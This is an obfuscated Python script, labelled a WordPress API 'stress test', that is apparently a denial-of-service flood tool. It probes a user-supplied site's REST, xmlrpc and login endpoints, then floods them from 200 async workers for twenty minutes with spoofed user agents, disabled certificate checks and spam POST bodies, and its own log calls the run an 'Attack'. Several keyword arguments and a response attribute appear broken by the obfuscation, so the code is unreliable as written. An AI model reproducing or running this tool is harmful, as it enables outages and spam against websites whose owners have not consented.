lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI = bool, __name__, range, Exception, input, KeyboardInterrupt

from requests.packages.urllib3 import disable_warnings as lIIIllIlIlIIlI
from logging import getLogger as IlIIlIllllIllI, basicConfig as IIIIIIllllIlIl, INFO as lIIIlllIIlIIll
from random import uniform as IllIllIIIIIllI, choice as lIIlllIIllIlIl
from aiohttp import ClientSession as llllIlIIIIllIl
from time import time as IIlIllIIIllIlI
from asyncio import sleep as llIIIllIlIIIIl, run as IIllIIIIIIllII, gather as IIlIIIIIIIIlII
from requests import head as IIIIIIIIlllIIl
from urllib3.exceptions import InsecureRequestWarning as llIlllIIllIIIl
lIIIllIlIlIIlI(llIlllIIllIIIl)
IIIIIIllllIlIl(level=lIIIlllIIlIIll, format='%(asctime)s - %(levelname)s - %(message)s')
IlIllIIlllIllIlIll = IlIIlIllllIllI('WordPressAPITester')

class IIlIIIlIIIIIIllIlI:

    def __init__(IlIlIIlIlIlllllIlI):
        IlIlIIlIlIlllllIlI.lIIlIlllIlIllIllIl = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36']
        IlIlIIlIlIlllllIlI.llllllIIIIlIIlllIl = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'}
        IlIlIIlIlIlllllIlI.IllllIllIIlIlIIlll = ['wp-json/wp/v2/posts', 'wp-json/wp/v2/users', 'wp-json/wp/v2/comments', 'wp-json', 'wp-admin', 'wp-login.php', 'xmlrpc.php', 'wp-includes', 'wp-content', 'wp-json/wp/v2/pages', 'wp-json/wp/v2/categories', 'wp-json/wp/v2/tags', 'wp-json/wp/v2/media', 'wp-cron.php', 'wp-links-opml.php']
        IlIlIIlIlIlllllIlI.IlllIIllIllllIIIlI = {'auth_test': {'username': 'admin', 'password': 'admin123'}, 'post_test': {'title': 'Spam', 'content': 'Spam Content', 'status': 'publish'}, 'comment_spam': {'author_name': 'Bot', 'author_email': 'bot@example.com', 'content': 'Spam Comment'}, 'search_test': {'s': 'test_search'}}

    def lIlIlIIlIIlIllIlII(IlIlIIlIlIlllllIlI):
        return lIIlllIIllIlIl(IlIlIIlIlIlllllIlI.lIIlIlllIlIllIllIl)

    async def lIlIllIlIIIIllIlII(IlIlIIlIlIlllllIlI, lllIIIIIIIIlllIIll, llIIlllIllllIIIIII, lIIIIIIllIIlIlllll, IllIIIllIlIlllIllI, llIlIlIlIIIlIlIlll=None):
        IlIIIllIIlIIlIllII = f"{lIIIIIIllIIlIlllll.rstrip('/')}/{IllIIIllIlIlllIllI.lstrip('/')}"
        IlIlIIlIlIlllllIlI.llllllIIIIlIIlllIl['User-Agent'] = IlIlIIlIlIlllllIlI.lIlIlIIlIIlIllIlII()
        try:
            async with lllIIIIIIIIlllIIll.request(llIIlllIllllIIIIII, IlIIIllIIlIIlIllII, json=llIlIlIlIIIlIlIlll, headers=IlIlIIlIlIlllllIlI.llllllIIIIlIIlllIl, ssl=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)) as IlIlIlIlIlIlIlllIl:
                IIIIllIIIIlIIIlllI = IlIlIlIlIlIlIlllIl.IIIIllIIIIlIIIlllI
                if IIIIllIIIIlIIIlllI in [404, 403]:
                    return None
                IlIllIIlllIllIlIll.info(f'[{IIIIllIIIIlIIIlllI}] {llIIlllIllllIIIIII} {IlIIIllIIlIIlIllII}')
                return await IlIlIlIlIlIlIlllIl.text() if IlIlIlIlIlIlIlllIl.ok else None
        except lllllllllllllII as IIIIIIIlIIIllIllll:
            IlIllIIlllIllIlIll.error(f'[ERROR] {llIIlllIllllIIIIII} {IlIIIllIIlIIlIllII}: {IIIIIIIlIIIllIllll}')
            return None

    async def IIlIlIIlIIllIIIllI(IlIlIIlIlIlllllIlI, lIIIIIIllIIlIlllll, IllllIllIIlIlIIlll, IIIIIllllIlIlIllIl):
        async with llllIlIIIIllIl() as lllIIIIIIIIlllIIll:
            IIlIIlIlIIlllIIIII = IIlIllIIIllIlI()
            while IIlIllIIIllIlI() - IIlIIlIlIIlllIIIII < IIIIIllllIlIlIllIl:
                IllIIIllIlIlllIllI = lIIlllIIllIlIl(IllllIllIIlIlIIlll)
                llIIlllIllllIIIIII = lIIlllIIllIlIl(['GET', 'POST'])
                IlIIIIlIllIlIlIIlI = IlIlIIlIlIlllllIlI.IlllIIllIllllIIIlI.get('post_test') if llIIlllIllllIIIIII == 'POST' else None
                lIlIIllllIIlIIIlll = await IlIlIIlIlIlllllIlI.lIlIllIlIIIIllIlII(lllIIIIIIIIlllIIll, llIIlllIllllIIIIII, lIIIIIIllIIlIlllll, IllIIIllIlIlllIllI, data=IlIIIIlIllIlIlIIlI)
                lIlIllIIlIlllIlllI = IllIllIIIIIllI(0.05, 0.2) if lIlIIllllIIlIIIlll else IllIllIIIIIllI(0.3, 0.6)
                await llIIIllIlIIIIl(lIlIllIIlIlllIlllI)

    def IllIlIIIlIlIIlIIlI(IlIlIIlIlIlllllIlI, lIIIIIIllIIlIlllll):
        IlIIIIlIllIIIIIlIl = []
        for IllIIIllIlIlllIllI in IlIlIIlIlIlllllIlI.IllllIllIIlIlIIlll:
            IlIIIllIIlIIlIllII = f"{lIIIIIIllIIlIlllll.rstrip('/')}/{IllIIIllIlIlllIllI.lstrip('/')}"
            try:
                IlIlIlIlIlIlIlllIl = IIIIIIIIlllIIl(IlIIIllIIlIIlIllII, headers={'User-Agent': IlIlIIlIlIlllllIlI.lIlIlIIlIIlIllIlII()}, timeout=3, verify=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
                if 200 <= IlIlIlIlIlIlIlllIl.status_code < 404:
                    IlIllIIlllIllIlIll.info(f'[SUCCESS] Found valid endpoint: {IllIIIllIlIlllIllI}')
                    IlIIIIlIllIIIIIlIl.append(IllIIIllIlIlllIllI)
            except lllllllllllllII as IIIIIIIlIIIllIllll:
                IlIllIIlllIllIlIll.error(f'Failed to verify endpoint {IllIIIllIlIlllIllI}: {IIIIIIIlIIIllIllll}')
        return IlIIIIlIllIIIIIlIl or IlIlIIlIlIlllllIlI.IllllIllIIlIlIIlll

    def IIIllIIlIIIllIIlIl(IlIlIIlIlIlllllIlI, lIIIIIIllIIlIlllll, IlllllIIIIIIlllIlI=100, IIIIIllllIlIlIllIl=3600):
        IlIllIIlllIllIlIll.info(f'[INFO] Starting async stress test on {lIIIIIIllIIlIlllll} for {IIIIIllllIlIlIllIl}s with {IlllllIIIIIIlllIlI} tasks')
        IlIIIIlIllIIIIIlIl = IlIlIIlIlIlllllIlI.IllIlIIIlIlIIlIIlI(lIIIIIIllIIlIlllll)
        if not IlIIIIlIllIIIIIlIl:
            IlIllIIlllIllIlIll.error('[ERROR] No valid endpoints found. Aborting test.')
            return
        IlIlIIlIlIlllllIlI.IllllIllIIlIlIIlll = IlIIIIlIllIIIIIlIl
        IIllIIIIIIllII(IIlIIIIIIIIlII(*[IlIlIIlIlIlllllIlI.IIlIlIIlIIllIIIllI(lIIIIIIllIIlIlllll, IlIlIIlIlIlllllIlI.IllllIllIIlIlIIlll, IIIIIllllIlIlIllIl) for IIlIlIllIIlIllIIll in lllllllllllllIl(IlllllIIIIIIlllIlI)]))

def lllIllIllIIIIllIll():
    IllIIlllIlllIlIlll = llllllllllllIll('Masukkan Target URL WordPress (e.g., https://example.com): ').strip()
    if not (IllIIlllIlllIlIlll.startswith('http://') or IllIIlllIlllIlIlll.startswith('https://')):
        IlIllIIlllIllIlIll.error('[ERROR] URL tidak valid. Harap sertakan http:// atau https://')
        return
    try:
        llllIIllllIIIIllll = IIlIIIlIIIIIIllIlI()
        llllIIllllIIIIllll.IIIllIIlIIIllIIlIl(IllIIlllIlllIlIlll, workers=200, duration=1200)
    except llllllllllllIlI:
        IlIllIIlllIllIlIll.info('\n[INFO] Attack interrupted by user.')
    except lllllllllllllII as IIIIIIIlIIIllIllll:
        IlIllIIlllIllIlIll.error(f'[ERROR] Unexpected error occurred: {IIIIIIIlIIIllIllll}')
if llllllllllllllI == '__main__':
    lllIllIllIIIIllIll()
